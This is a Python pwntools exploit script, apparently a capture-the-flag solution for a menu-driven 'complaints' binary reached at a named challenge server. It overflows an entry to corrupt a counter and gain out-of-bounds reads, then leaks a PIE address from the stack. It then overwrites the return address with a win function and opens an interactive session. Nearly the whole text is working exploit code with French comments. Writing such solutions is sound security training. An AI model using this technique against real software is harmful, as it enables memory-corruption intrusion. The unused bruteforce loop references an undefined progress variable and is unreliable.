from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep
import re
import subprocess

context.arch = "amd64"
context.word_size = 64
context.bits = 64
context.os = "linux"

file = "./liberte_v2"
exe_args = []
io: process = None
PREFIX = b": "

speed = 0.2

def debug():
    gdb.attach(io, gdbscript=
    """
    
    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote("challenges.nobrackets.fr", 10203)

def launch_local():
    global file, io
    io = process([file, *exe_args])
    if args.GDB:
        debug()

def solve_pow():
    leak = recvu(b"===================")
    pow = getb(leak, b") solve ", b"\n").decode()
    proc = subprocess.Popen(["solvepow", "solve", pow], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    pow = proc.communicate()[0]
    sla(b"Solution? ", pow)

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
binsh = lambda: next(libc.search(b"/bin/sh\0"))
snum = lambda a, b: sla(a, str(b).encode("iso-8859-1"))
sprefix = lambda a: sla(PREFIX, a)
choice = lambda a: snum(PREFIX, a)
show_leak = lambda a, b: success("%s: %#018x" % (a, b))

def launch():
    if args.REMOTE:
        l = launch_remote
    else:
        l = launch_local
    with context.local(log_level=logging.ERROR):
        l()
    if args.POW:
        solve_pow()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]

# ================================================================
# EXPLOIT HERE
# ================================================================

with context.local(log_level=logging.ERROR):
    exe = ELF(file)
    libc = ELF("./libc.so.6")

tries = 0
# tries_prog = log.progress("Tries")
def exploit():
    def add(data):
        choice(1)
        sprefix(data)
    def edit(index, data):
        choice(2)
        choice(index)
        sprefix(data)
    def show():
        choice(3)
        recvu(b"Liste des plaintes:\n")
        leak = recvu(b"1. Ajouter")
        leaks = []
        for l in leak.splitlines():
            leaks.append(getb(l, b". ", b""))
        return leaks
    def quit():
        choice(0)
    
    for _ in range(5): # On ajoute 5 plaintes
        add(b"a")

    # On modifie la dernière pour réécrire nombre_plainte et obtenir un "Out of bound"
    edit(4, b"A"*0x10 + p64(0x20)[:5])

    leaks = show() # On utilise le "Out of bound" pour leak des valeurs de la stack
    exe.address = u64(leaks[0xc]) - 0x3d88 # On leak une adresse du binaire (PIE leak) donc on connait l'adresse de win
    show_leak("exe", exe.address)

    edit(6, b"A"*8 + p64(exe.sym.win+5)) # On réécrire l'adresse de retour de main_logic par celle de win+5 pour éviter les problèmes de stack pas aligné.
    quit() # On quitte le menu pour sauter sur win+5

    io.interactive() # le flag
    input("end")
    exit()

launch()
exploit()
exit()

# if bruteforce is required
while True:
    count = 0
    tries += 1
    tries_prog.status(str(tries))

    launch()
    try:
        exploit()
    except EOFError:
        pass

    with context.local(log_level=logging.ERROR):
        io.close()
    # sleep(0.05)
